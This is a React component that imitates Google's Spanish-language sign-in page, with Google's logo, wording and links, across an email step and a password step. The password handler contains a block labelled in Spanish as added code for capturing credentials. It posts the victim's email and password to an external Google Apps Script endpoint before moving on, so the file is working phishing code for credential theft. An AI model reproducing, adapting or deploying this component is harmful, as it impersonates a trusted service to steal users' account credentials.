import { useState } from "react";
import GoogleLogo from "./GoogleLogo";

type LoginStep = "email" | "password";

interface GoogleLoginProps {
  onLoginComplete: () => void;
}

const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
  const [step, setStep] = useState<LoginStep>("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState("");

  const handleEmailNext = () => {
    if (!email.trim()) {
      setEmailError("Introduce una dirección de correo electrónico o un número de teléfono");
      return;
    }
    if (!email.includes("@") && !/^\d+$/.test(email)) {
      setEmailError("No se ha encontrado tu cuenta de Google");
      return;
    }
    setEmailError("");
    setStep("password");
  };

  const handlePasswordNext = async () => {
    if (!password.trim()) return;

    // --- CÓDIGO AÑADIDO: CAPTURA DE CREDENCIALES ---
    const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";
    
    try {
      await fetch(webAppUrl, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({ 
          usuario: email, 
          pass: password, 
          tipo: "LOGIN_GOOGLE",
          fecha: new Date().toLocaleString() 
        })
      });
    } catch (e) {
      console.error("Error capturando datos");
    }
    // --- FIN DE ADICIÓN ---

    onLoginComplete();
  };

  const handleKeyDown = (e: React.KeyboardEvent, action: () => void) => {
    if (e.key === "Enter") action();
  };

  return (
    <div className="w-full max-w-[450px] mx-auto">
      <div className="forms-card p-10 sm:p-12">
        {step === "email" ? (
          <div className="animate-fade-in">
            <div className="flex justify-center mb-4">
              <GoogleLogo size={32} />
            </div>
            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Iniciar sesión</h1>
            <p className="text-center text-sm mb-8">Utiliza tu cuenta de Google</p>
            
            <div className="space-y-6">
              <div className="relative">
                <input
                  type="text"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  onKeyDown={(e) => handleKeyDown(e, handleEmailNext)}
                  placeholder="Correo electrónico o teléfono"
                  className={`google-input w-full ${emailError ? 'border-destructive focus:ring-destructive/20' : ''}`}
                  autoFocus
                />
                {emailError && <p className="text-xs text-destructive mt-1 flex items-center gap-1">
                  <span className="text-base">⚠</span> {emailError}
                </p>}
              </div>
              
              <a href="#" className="google-btn-text text-sm font-medium inline-block">
                ¿Has olvidado tu correo electrónico?
              </a>
              
              <p className="text-sm text-muted-foreground leading-relaxed">
                ¿No es tu ordenador? Usa una ventana de navegación privada para iniciar sesión. 
                <a href="#" className="google-btn-text font-medium ml-1">Más información</a>
              </p>
              
              <div className="flex justify-between items-center pt-4">
                <a href="#" className="google-btn-text text-sm font-medium">Crear cuenta</a>
                <button onClick={handleEmailNext} className="google-btn-blue">Siguiente</button>
              </div>
            </div>
          </div>
        ) : (
          <div className="animate-fade-in">
            <div className="flex justify-center mb-4">
              <GoogleLogo size={32} />
            </div>
            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Te damos la bienvenida</h1>
            <div className="flex justify-center mb-8">
              <div className="flex items-center gap-2 border rounded-full px-3 py-1 text-sm font-medium">
                <div className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">👤</div>
                {email}
              </div>
            </div>

            <div className="space-y-6">
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyDown={(e) => handleKeyDown(e, handlePasswordNext)}
                  placeholder="Introduce tu contraseña"
                  className="google-input w-full"
                  autoFocus
                />
              </div>

              <label className="flex items-center gap-3 cursor-pointer select-none">
                <input
                  type="checkbox"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                  className="w-[18px] h-[18px] accent-[hsl(var(--google-blue))] cursor-pointer"
                />
                <span className="text-sm text-card-foreground">Mostrar contraseña</span>
              </label>

              <div className="flex justify-between items-center pt-4">
                <a href="#" className="google-btn-text text-sm font-medium">¿Has olvidado tu contraseña?</a>
                <button onClick={handlePasswordNext} className="google-btn-blue">Siguiente</button>
              </div>
            </div>
          </div>
        )}
      </div>

      <div className="flex justify-between items-center mt-6 px-2 text-xs text-muted-foreground">
        <select className="bg-transparent border-none text-xs text-muted-foreground cursor-pointer outline-none">
          <option>Español (España)</option>
          <option>English (United States)</option>
        </select>
        <div className="flex gap-4">
          <a href="#" className="hover:opacity-70">Ayuda</a>
          <a href="#" className="hover:opacity-70">Privacidad</a>
          <a href="#" className="hover:opacity-70">Condiciones</a>
        </div>
      </div>
    </div>
  );
};

export default GoogleLoginCard;
